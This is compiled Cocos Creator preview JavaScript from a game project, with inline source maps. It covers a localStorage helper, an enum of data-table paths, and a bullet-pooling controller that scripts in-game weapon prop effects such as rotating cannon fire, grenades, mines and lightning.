//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvcGVyc2lzdGVuY2UvTG9jYWxTdG9yYWdlLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7O0FBRUE7SUFBQTtJQThEQSxDQUFDO0lBM0RrQixnQkFBRyxHQUFsQixVQUFtQixHQUFVO1FBQ3pCLE9BQU8sRUFBRSxDQUFDLEdBQUcsQ0FBQyxZQUFZLENBQUMsT0FBTyxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsR0FBRyxDQUFDLENBQUM7SUFDMUQsQ0FBQztJQUVjLGdCQUFHLEdBQWxCLFVBQW1CLEdBQVUsRUFBRSxLQUFTO1FBQ3BDLEVBQUUsQ0FBQyxHQUFHLENBQUMsWUFBWSxDQUFDLE9BQU8sQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLEdBQUcsRUFBRSxLQUFLLENBQUMsQ0FBQztJQUMxRCxDQUFDO0lBRU0sc0JBQVMsR0FBaEIsVUFBaUIsR0FBVTtRQUN2QixJQUFJLEdBQUcsR0FBRyxJQUFJLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxDQUFDO1FBQ3hCLElBQUksR0FBRyxJQUFJLElBQUksRUFBQztZQUNaLE9BQU8sSUFBSSxDQUFDO1NBQ2Y7UUFDRCxPQUFPLFFBQVEsQ0FBQyxHQUFHLENBQUMsQ0FBQztJQUN6QixDQUFDO0lBRU0sc0JBQVMsR0FBaEIsVUFBaUIsR0FBVSxFQUFFLEtBQVk7UUFDckMsSUFBSSxDQUFDLEdBQUcsQ0FBQyxHQUFHLEVBQUUsS0FBSyxDQUFDLENBQUM7SUFDekIsQ0FBQztJQUVNLHVCQUFVLEdBQWpCLFVBQWtCLEdBQVU7UUFDeEIsSUFBSSxHQUFHLEdBQUcsSUFBSSxDQUFDLFNBQVMsQ0FBQyxHQUFHLENBQUMsQ0FBQztRQUM5QixPQUFPLENBQUMsQ0FBQyxHQUFHLENBQUM7SUFDakIsQ0FBQztJQUVNLHVCQUFVLEdBQWpCLFVBQWtCLEdBQVUsRUFBRSxDQUFTO1FBQ25DLElBQUksS0FBSyxHQUFHLENBQUMsQ0FBQztRQUNkLElBQUksQ0FBQyxFQUFDO1lBQ0YsS0FBSyxHQUFHLENBQUMsQ0FBQztTQUNiO1FBQ0QsSUFBSSxDQUFDLEdBQUcsQ0FBQyxHQUFHLEVBQUUsS0FBSyxDQUFDLENBQUM7SUFDekIsQ0FBQztJQUdNLHNCQUFTLEdBQWhCLFVBQWlCLEdBQVU7UUFDdkIsT0FBTyxJQUFJLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxDQUFDO0lBQ3pCLENBQUM7SUFFTSxzQkFBUyxHQUFoQixVQUFpQixHQUFVLEVBQUUsS0FBWTtRQUNyQyxJQUFJLENBQUMsR0FBRyxDQUFDLEdBQUcsRUFBRSxLQUFLLENBQUMsQ0FBQztJQUN6QixDQUFDO0lBRU0sc0JBQVMsR0FBaEIsVUFBaUIsR0FBVSxFQUFFLEdBQWM7UUFDdkMsSUFBSSxHQUFHLEdBQUcsSUFBSSxDQUFDLEdBQUcsQ0FBQyxHQUFHLENBQUMsQ0FBQztRQUN4QixJQUFJLEdBQUcsRUFBQztZQUNKLEdBQUcsQ0FBQyxNQUFNLENBQUMsSUFBSSxDQUFDLEtBQUssQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDO1lBQzVCLE9BQU8sR0FBRyxDQUFDO1NBQ2Q7UUFDRCxPQUFPLElBQUksQ0FBQztJQUNoQixDQUFDO0lBRU0sc0JBQVMsR0FBaEIsVUFBaUIsR0FBVSxFQUFFLEdBQWM7UUFDdkMsSUFBSSxLQUFLLEdBQUcsR0FBRyxDQUFDLE1BQU0sRUFBRSxDQUFDO1FBQ3pCLElBQUksT0FBTyxLQUFLLElBQUksUUFBUSxFQUFFO1lBQzFCLEtBQUssR0FBRyxJQUFJLENBQUMsU0FBUyxDQUFDLEtBQUssQ0FBQyxDQUFDO1NBQ2pDO1FBQ0QsSUFBSSxDQUFDLEdBQUcsQ0FBQyxHQUFHLEVBQUUsS0FBSyxDQUFDLENBQUM7SUFDekIsQ0FBQztJQTNETSxtQkFBTSxHQUFHLEVBQUUsQ0FBQztJQTZEdkIsbUJBQUM7Q0E5REQsQUE4REMsSUFBQTtBQTlEWSxvQ0FBWSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbImltcG9ydCB7SUNvbnZlcnRlcn0gZnJvbSBcIi4uL2NvbnZlcnRlci9JQ29udmVydGVyXCI7XHJcblxyXG5leHBvcnQgY2xhc3MgTG9jYWxTdG9yYWdlIHtcclxuICAgIHN0YXRpYyBwcmVmaXggPSBcIlwiO1xyXG5cclxuICAgIHByaXZhdGUgc3RhdGljIGdldChrZXk6c3RyaW5nKXtcclxuICAgICAgICByZXR1cm4gY2Muc3lzLmxvY2FsU3RvcmFnZS5nZXRJdGVtKHRoaXMucHJlZml4ICsga2V5KTtcclxuICAgIH1cclxuXHJcbiAgICBwcml2YXRlIHN0YXRpYyBzZXQoa2V5OnN0cmluZywgdmFsdWU6YW55KXtcclxuICAgICAgICBjYy5zeXMubG9jYWxTdG9yYWdlLnNldEl0ZW0odGhpcy5wcmVmaXggKyBrZXksIHZhbHVlKTtcclxuICAgIH1cclxuXHJcbiAgICBzdGF0aWMgZ2V0TnVtYmVyKGtleTpzdHJpbmcpOm51bWJlcnxudWxse1xyXG4gICAgICAgIGxldCB2YWwgPSB0aGlzLmdldChrZXkpO1xyXG4gICAgICAgIGlmICh2YWwgPT0gbnVsbCl7XHJcbiAgICAgICAgICAgIHJldHVybiBudWxsO1xyXG4gICAgICAgIH1cclxuICAgICAgICByZXR1cm4gcGFyc2VJbnQodmFsKTtcclxuICAgIH1cclxuXHJcbiAgICBzdGF0aWMgc2V0TnVtYmVyKGtleTpzdHJpbmcsIHZhbHVlOm51bWJlcil7XHJcbiAgICAgICAgdGhpcy5zZXQoa2V5LCB2YWx1ZSk7XHJcbiAgICB9XHJcblxyXG4gICAgc3RhdGljIGdldEJvb2xlYW4oa2V5OnN0cmluZyk6Ym9vbGVhbntcclxuICAgICAgICBsZXQgdmFsID0gdGhpcy5nZXROdW1iZXIoa2V5KTtcclxuICAgICAgICByZXR1cm4gISF2YWw7XHJcbiAgICB9XHJcblxyXG4gICAgc3RhdGljIHNldEJvb2xlYW4oa2V5OnN0cmluZywgYjpib29sZWFuKXtcclxuICAgICAgICBsZXQgdmFsdWUgPSAwO1xyXG4gICAgICAgIGlmIChiKXtcclxuICAgICAgICAgICAgdmFsdWUgPSAxO1xyXG4gICAgICAgIH1cclxuICAgICAgICB0aGlzLnNldChrZXksIHZhbHVlKTtcclxuICAgIH1cclxuXHJcblxyXG4gICAgc3RhdGljIGdldFN0cmluZyhrZXk6c3RyaW5nKTpzdHJpbmd8bnVsbHtcclxuICAgICAgICByZXR1cm4gdGhpcy5nZXQoa2V5KTtcclxuICAgIH1cclxuXHJcbiAgICBzdGF0aWMgc2V0U3RyaW5nKGtleTpzdHJpbmcsIHZhbHVlOnN0cmluZyl7XHJcbiAgICAgICAgdGhpcy5zZXQoa2V5LCB2YWx1ZSk7XHJcbiAgICB9XHJcblxyXG4gICAgc3RhdGljIGdldE9iamVjdChrZXk6c3RyaW5nLCBvYmo6SUNvbnZlcnRlcil7XHJcbiAgICAgICAgbGV0IHZhbCA9IHRoaXMuZ2V0KGtleSk7XHJcbiAgICAgICAgaWYgKHZhbCl7XHJcbiAgICAgICAgICAgIG9iai5kZWNvZGUoSlNPTi5wYXJzZSh2YWwpKTtcclxuICAgICAgICAgICAgcmV0dXJuIG9iajtcclxuICAgICAgICB9XHJcbiAgICAgICAgcmV0dXJuIG51bGw7XHJcbiAgICB9XHJcblxyXG4gICAgc3RhdGljIHNldE9iamVjdChrZXk6c3RyaW5nLCBvYmo6SUNvbnZlcnRlcil7XHJcbiAgICAgICAgbGV0IHZhbHVlID0gb2JqLmVuY29kZSgpO1xyXG4gICAgICAgIGlmICh0eXBlb2YgdmFsdWUgPT0gXCJvYmplY3RcIikge1xyXG4gICAgICAgICAgICB2YWx1ZSA9IEpTT04uc3RyaW5naWZ5KHZhbHVlKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgdGhpcy5zZXQoa2V5LCB2YWx1ZSk7XHJcbiAgICB9XHJcblxyXG59XHJcblxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/config/ExcelTableNames.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '0dad0SXeYlGkpEmyAnB7fj4', 'ExcelTableNames');
// script/app/config/ExcelTableNames.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
exports.ExcelTableNames = void 0;
var ExcelTableNames;
(function (ExcelTableNames) {
    ExcelTableNames["Level"] = "data/level_full";
    ExcelTableNames["Enemy"] = "data/enemy_full";
    ExcelTableNames["Weapon"] = "data/weapon_full";
    ExcelTableNames["StartEnemy"] = "data/startem_full";
    ExcelTableNames["Prop"] = "data/prop_full";
    ExcelTableNames["WeaponUp"] = "data/weapon_up_full";
    ExcelTableNames["BulletUp"] = "data/bullet_up_full";
    ExcelTableNames["EnemyUp"] = "data/enemy_up_full";
    ExcelTableNames["GoldUp"] = "data/gold_up_full";
})(ExcelTableNames = exports.ExcelTableNames || (exports.ExcelTableNames = {}));

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2NvbmZpZy9FeGNlbFRhYmxlTmFtZXMudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7O0FBQUEsb0JBQW9CO0FBQ3BCLGlGQUFpRjtBQUNqRix5RkFBeUY7QUFDekYsbUJBQW1CO0FBQ25CLDJGQUEyRjtBQUMzRixtR0FBbUc7QUFDbkcsOEJBQThCO0FBQzlCLDJGQUEyRjtBQUMzRixtR0FBbUc7OztBQStCbkcsSUFBWSxlQVVYO0FBVkQsV0FBWSxlQUFlO0lBQ3ZCLDRDQUF5QixDQUFBO0lBQ3pCLDRDQUF5QixDQUFBO0lBQ3pCLDhDQUEyQixDQUFBO0lBQzNCLG1EQUFnQyxDQUFBO0lBQ2hDLDBDQUF1QixDQUFBO0lBQ3ZCLG1EQUFnQyxDQUFBO0lBQ2hDLG1EQUFnQyxDQUFBO0lBQ2hDLGlEQUE4QixDQUFBO0lBQzlCLCtDQUE0QixDQUFBO0FBQ2hDLENBQUMsRUFWVyxlQUFlLEdBQWYsdUJBQWUsS0FBZix1QkFBZSxRQVUxQiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIi8vIExlYXJuIFR5cGVTY3JpcHQ6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3R5cGVzY3JpcHQuaHRtbFxyXG4vLyBMZWFybiBBdHRyaWJ1dGU6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vIExlYXJuIGxpZmUtY3ljbGUgY2FsbGJhY2tzOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG5cclxuLyoqXHJcbiAqIOWFs+WNoemFjee9rlxyXG4gKi9cclxuZXhwb3J0IGludGVyZmFjZSBMZXZlbENvbmZpZyB7XHJcbiAgICBsZXZlbDpudW1iZXI7Ly/lhbPljaFcclxuICAgIGRlbGltaXRfcDE6bnVtYmVyOy8v56ys5LiA6Zi25q615ZCM5bGP5LiL6ZmQ5Z+65pWwXHJcbiAgICBsaW1pdF9wMTpudW1iZXI7Ly/nrKzkuIDpmLbmrrXlkIzlsY/kuIrpmZBcclxuICAgIGFtb3VudF9wMTpudW1iZXI7Ly/nrKzkuIDpmLbmrrXmgLvmlbBcclxuICAgIHAxX2VuZW15XzE6bnVtYmVyOy8v56ys5LiA6Zi25q615oCq54mpMeeahOavlOS+i1xyXG4gICAgcDFfZW5lbXlfMjpudW1iZXI7XHJcbiAgICBwMV9lbmVteV8zOm51bWJlcjtcclxuICAgIHAxX2VuZW15XzQ6bnVtYmVyO1xyXG4gICAgcDFfZW5lbXlfNTpudW1iZXI7XHJcbiAgICBwMV9lbmVteV82Om51bWJlcjtcclxuICAgIHAxX2Jvc3NfNzpudW1iZXI7XHJcbiAgICBwMV9ib3NzXzg6bnVtYmVyO1xyXG4gICAgZGVsaW1pdF9wMjpudW1iZXI7XHJcbiAgICBsaW1pdF9wMjpudW1iZXI7XHJcbiAgICBhbW91bnRfcDI6bnVtYmVyO1xyXG4gICAgcDJfZW5lbXlfMTpudW1iZXI7XHJcbiAgICBwMl9lbmVteV8yOm51bWJlcjtcclxuICAgIHAyX2VuZW15XzM6bnVtYmVyO1xyXG4gICAgcDJfZW5lbXlfNDpudW1iZXI7XHJcbiAgICBwMl9lbmVteV81Om51bWJlcjtcclxuICAgIHAyX2VuZW15XzY6bnVtYmVyO1xyXG4gICAgcDJfYm9zc183Om51bWJlcjtcclxuICAgIHAyX2Jvc3NfODpudW1iZXI7XHJcbn1cclxuXHJcbmV4cG9ydCBlbnVtIEV4Y2VsVGFibGVOYW1lcyB7XHJcbiAgICBMZXZlbCA9IFwiZGF0YS9sZXZlbF9mdWxsXCIsXHJcbiAgICBFbmVteSA9IFwiZGF0YS9lbmVteV9mdWxsXCIsXHJcbiAgICBXZWFwb24gPSBcImRhdGEvd2VhcG9uX2Z1bGxcIixcclxuICAgIFN0YXJ0RW5lbXkgPSBcImRhdGEvc3RhcnRlbV9mdWxsXCIsXHJcbiAgICBQcm9wID0gXCJkYXRhL3Byb3BfZnVsbFwiLFxyXG4gICAgV2VhcG9uVXAgPSBcImRhdGEvd2VhcG9uX3VwX2Z1bGxcIixcclxuICAgIEJ1bGxldFVwID0gXCJkYXRhL2J1bGxldF91cF9mdWxsXCIsXHJcbiAgICBFbmVteVVwID0gXCJkYXRhL2VuZW15X3VwX2Z1bGxcIixcclxuICAgIEdvbGRVcCA9IFwiZGF0YS9nb2xkX3VwX2Z1bGxcIixcclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/game/GameBulletsController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'f9d40q9ABdCG5owk3OPy0zK', 'GameBulletsController');
// script/app/game/GameBulletsController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var BulletStrike_1 = require("../entities/bulletStrike/BulletStrike");
var Bullet_1 = require("../entities/bullet/Bullet");
var GameProxy_1 = require("./GameProxy");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var GameBulletsController = /** @class */ (function (_super) {
    __extends(GameBulletsController, _super);
    function GameBulletsController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.bulletLayer = null;
        _this.bulletStrikeLayer = null;
        _this.enemyBulletLayer = null;
        _this._bulletMap = new Map();
        _this._bulletStrikeMap = new Map();
        _this._enemyBulletMap = new Map();
        _this._propBulletMap = new Map();
        _this.roleBullets = [];
        _this.enemyBullets = [];
        return _this;
    }
    GameBulletsController.prototype.genBullet = function (id) {
        var prefabPath = 'prefab/entities/bullet/bullet' + id;
        var entityPrefab = cc.loader.getRes(prefabPath, cc.Prefab);
        var node = cc.instantiate(entityPrefab);
        this.bulletLayer.addChild(node);
        var bullet = node.getComponent(Bullet_1.default);
        bullet.init(id);
        var arr = this._bulletMap.get(id);
        if (typeof arr == "undefined") {
            arr = [];
            this._bulletMap.set(id, arr);
        }
        arr.push(bullet);
        node.active = false;
        return bullet;
    };
    GameBulletsController.prototype.getInactiveBullet = function (id) {
        var result = undefined;
        var arr = this._bulletMap.get(id);
        if (typeof arr != 'undefined') {
            result = arr.find(function (value) { return value.node.active == false; });
        }
        if (typeof result == "undefined") {
            result = this.genBullet(id);
        }
        return result;
    };
    GameBulletsController.prototype.genBulletStrike = function (id) {
        var prefabPath = 'prefab/entities/bullet/bullet' + id + "Strike";
        var entityPrefab = cc.loader.getRes(prefabPath, cc.Prefab);
        var node = cc.instantiate(entityPrefab);
        this.bulletStrikeLayer.addChild(node);
        var bulletStrike = node.getComponent(BulletStrike_1.default);
        bulletStrike.init(id);
        var arr = this._bulletStrikeMap.get(id);
        if (typeof arr == "undefined") {
            arr = [];
            this._bulletStrikeMap.set(id, arr);
        }
        arr.push(bulletStrike);
        node.active = false;
        return bulletStrike;
    };
    GameBulletsController.prototype.getInactiveBulletStrike = function (id) {
        var result = undefined;
        var arr = this._bulletStrikeMap.get(id);
        if (typeof arr != 'undefined') {
            result = arr.find(function (value) { return value.node.active == false; });
        }
        if (typeof result == "undefined") {
            result = this.genBulletStrike(id);
        }
        return result;
    };
    GameBulletsController.prototype.genEnemyBullet = function (id) {
        var prefabPath = 'prefab/entities/bullet/enemyBullet' + id;
        var entityPrefab = cc.loader.getRes(prefabPath, cc.Prefab);
        var node = cc.instantiate(entityPrefab);
        this.enemyBulletLayer.addChild(node);
        var bullet = node.getComponent(Bullet_1.default);
        bullet.init(id);
        var arr = this._enemyBulletMap.get(id);
        if (typeof arr == "undefined") {
            arr = [];
            this._enemyBulletMap.set(id, arr);
        }
        arr.push(bullet);
        node.active = false;
        return bullet;
    };
    GameBulletsController.prototype.getInactiveEnemyBullet = function (id) {
        var result = undefined;
        var arr = this._enemyBulletMap.get(id);
        if (typeof arr != 'undefined') {
            result = arr.find(function (value) { return value.node.active == false; });
        }
        if (typeof result == "undefined") {
            result = this.genEnemyBullet(id);
        }
        return result;
    };
    GameBulletsController.prototype.genPropBullet = function (id) {
        var prefabPath = 'prefab/entities/bullet/propBullet' + id;
        var entityPrefab = cc.loader.getRes(prefabPath, cc.Prefab);
        var node = cc.instantiate(entityPrefab);
        this.bulletLayer.addChild(node);
        var bullet = node.getComponent(Bullet_1.default);
        bullet.init(id);
        var arr = this._propBulletMap.get(id);
        if (typeof arr == "undefined") {
            arr = [];
            this._propBulletMap.set(id, arr);
        }
        arr.push(bullet);
        node.active = false;
        return bullet;
    };
    GameBulletsController.prototype.getInactivePropBullet = function (id) {
        var result = undefined;
        var arr = this._propBulletMap.get(id);
        if (typeof arr != 'undefined') {
            result = arr.find(function (value) { return value.node.active == false; });
        }
        if (typeof result == "undefined") {
            result = this.genPropBullet(id);
        }
        return result;
    };
    GameBulletsController.prototype.onLoad = function () {
        this.node.on(GameProxy_1.GameProxy.Event.PropTrigger, this.onPropTrigger, this);
        window['GameBulletsController'] = this;
    };
    GameBulletsController.prototype.onDestroy = function () {
        this.node.off(GameProxy_1.GameProxy.Event.PropTrigger, this.onPropTrigger, this);
    };
    GameBulletsController.prototype.onPropTrigger = function (prop) {
        var _this = this;
        switch (prop.propID) {
            case 1:
                {
                    /** 两个方向 360度 一遍转圈 一遍开炮 */
                    var firingRange_1 = 500;
                    var speed = 1000;
                    var bulletDuration_1 = firingRange_1 / speed;
                    var duration = 2;
                    var num = 20;
                    var onceTime = duration / num;
                    var onceDegree_1 = 360 / num;
                    var startPos_1 = cc.v2(prop.node.x, prop.node.y);
                    var _loop_1 = function (i) {
                        this_1.node.runAction(cc.sequence(cc.delayTime(i * onceTime), cc.callFunc(function () {
                            /** 发射火炮 */
                            var bullet = _this.getInactivePropBullet(1);
                            bullet.node.active = true;
                            bullet.node.rotation = i * onceDegree_1;
                            var dir = cc.v2(0, 1).rotateSelf(cc.misc.degreesToRadians(-bullet.node.rotation)).normalizeSelf();
                            bullet.node.position = startPos_1.add(dir.mul(60));
                            bullet.node.runAction(cc.sequence(cc.moveBy(bulletDuration_1, dir.mul(firingRange_1)).easing(cc.easeSineOut()), cc.callFunc(function () {
                                bullet.node.active = false;
                            })));
                            var bullet2 = _this.getInactivePropBullet(1);
                            bullet2.node.active = true;
                            bullet2.node.rotation = i * onceDegree_1 + 180;
                            var dir2 = cc.v2(0, 1).rotateSelf(cc.misc.degreesToRadians(-bullet2.node.rotation)).normalizeSelf();
                            bullet2.node.position = startPos_1.add(dir2.mul(60));
                            bullet2.node.runAction(cc.sequence(cc.moveBy(bulletDuration_1, dir2.mul(firingRange_1)).easing(cc.easeSineOut()), cc.callFunc(function () {
                                bullet2.node.active = false;
                            })));
                        })));
                    };
                    var this_1 = this;
                    for (var i = 0; i < num; i++) {
                        _loop_1(i);
                    }
                }
                break;
            case 2:
                {
                    /** 全方位炸弹：依次弹出6颗手雷（顺时针） 炸弹各个方向滚动 撞到怪物后爆炸 */
                    var num_1 = 6;
                    var onceDegree_2 = 360 / 6;
                    var onceTime_1 = 0.05;
                    var moveLen_1 = 100;
                    var moveSpeed = 1000;
                    var moveDuration_1 = moveLen_1 / moveSpeed;
                    var startPos_2 = cc.v2(prop.node.x, prop.node.y);
                    var _loop_2 = function (i) {
                        this_2.node.runAction(cc.sequence(cc.delayTime(i * onceTime_1), cc.callFunc(function () {
                            var bullet = _this.getInactivePropBullet(2);
                            bullet.node.active = true;
                            var degree = 30 + i * onceDegree_2;
                            bullet.node.rotation = degree - 90;
                            var dir = cc.v2(0, 1).rotateSelf(cc.misc.degreesToRadians(-degree)).normalizeSelf();
                            bullet.node.position = startPos_2;
                            bullet.node.scale = 0;
                            bullet.node.runAction(cc.scaleTo(moveDuration_1, 1));
                            bullet.node.runAction(cc.sequence(cc.moveBy(moveDuration_1, dir.mul(moveLen_1)), cc.delayTime((num_1 - i - 1) * onceTime_1), cc.callFunc(function () {
                                bullet.move(dir);
                            })));
                        })));
                    };
                    var this_2 = this;
                    for (var i = 0; i < num_1; i++) {
                        _loop_2(i);
                    }
                }
                break;
            case 3:
                {
                    /** 发出12个地雷 怪物踩到就会爆炸 地雷持续20S */
                    var num = 6;
                    var onceDegree_3 = 360 / 6;
                    var onceTime = 0.05;
                    var moveLen_2 = 80;
                    var moveSpeed = 1000;
                    var moveDuration_2 = moveLen_2 / moveSpeed;
                    var time_1 = 20;
                    var startPos_3 = cc.v2(prop.node.x, prop.node.y);
                    var _loop_3 = function (i) {
                        this_3.node.runAction(cc.sequence(cc.delayTime(i * onceTime), cc.callFunc(function () {
                            var bullet = _this.getInactivePropBullet(3);
                            bullet.node.active = true;
                            var degree = 30 + i * onceDegree_3;
                            bullet.node.rotation = degree - 90;
                            var dir = cc.v2(0, 1).rotateSelf(cc.misc.degreesToRadians(-degree)).normalizeSelf();
                            bullet.node.position = startPos_3;
                            bullet.node.scale = 0;
                            bullet.node.runAction(cc.scaleTo(moveDuration_2, 1));
                            bullet.collider.enabled = false;
                            bullet.node.runAction(cc.sequence(cc.moveBy(moveDuration_2, dir.mul(moveLen_2)), cc.callFunc(function () {
                                bullet.collider.enabled = true;
                                bullet.node.runAction(cc.sequence(cc.delayTime(time_1), cc.callFunc(function () {
                                    bullet.node.active = false;
                                })));
                            })));
                        })));
                    };
                    var this_3 = this;
                    for (var i = 0; i < num; i++) {
                        _loop_3(i);
                    }
                    var _loop_4 = function (i) {
                        this_4.node.runAction(cc.sequence(cc.delayTime((i + num) * onceTime), cc.callFunc(function () {
                            var bullet = _this.getInactivePropBullet(3);
                            bullet.node.active = true;
                            var degree = 60 + i * onceDegree_3;
                            bullet.node.rotation = degree - 90;
                            var dir = cc.v2(0, 1).rotateSelf(cc.misc.degreesToRadians(-degree)).normalizeSelf();
                            bullet.node.position = startPos_3;
                            bullet.node.scale = 0;
                            bullet.node.runAction(cc.scaleTo(moveDuration_2, 1));
                            bullet.collider.enabled = false;
                            bullet.node.runAction(cc.sequence(cc.moveBy(moveDuration_2, dir.mul(moveLen_2 + 60)), cc.callFunc(function () {
                                bullet.collider.enabled = true;
                                bullet.node.runAction(cc.sequence(cc.delayTime(time_1), cc.callFunc(function () {
                                    bullet.node.active = false;
                                })));
                            })));
                        })));
                    };
                    var this_4 = this;
                    for (var i = 0; i < num; i++) {
                        _loop_4(i);
                    }
                }
                break;
            case 4:
                {
                    /** 播放见光死的动画 */
                    var bullet = this.getInactivePropBullet(4);
                    bullet.node.position = prop.node.position;
                    bullet.node.active = true;
                    bullet.execute();
                }
                break;
            case 6:
                {
                    /** 找最近的怪生成闪电 */
                    var list = window['GameEnemysController'].allAliveAndInScreenEnemy();
                    // console.log("list===>", list);
                    if (list.length > 0) {
                        var minDistance_1 = -1;
                        var enemy_1 = null;
                        list.forEach(function (value) {
                            var distance = prop.node.position.sub(value.node.position).mag();
                            if (minDistance_1 < 0 || distance < minDistance_1) {
                                minDistance_1 = distance;
                                enemy_1 = value;
                            }
                        });
                        /** 生成闪电 */
                        var bullet = this.getInactivePropBullet(6);
                        bullet.node.position = prop.node.position;
                        bullet.joint(enemy_1.node.position);
                    }
                }
                break;
        }
    };
    __decorate([
        property(cc.Node)
    ], GameBulletsController.prototype, "bulletLayer", void 0);
    __decorate([
        property(cc.Node)
    ], GameBulletsController.prototype, "bulletStrikeLayer", void 0);
    __decorate([
        property(cc.Node)
    ], GameBulletsController.prototype, "enemyBulletLayer", void 0);
    GameBulletsController = __decorate([
        ccclass
    ], GameBulletsController);
    return GameBulletsController;
}(cc.Component));
exports.default = GameBulletsController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
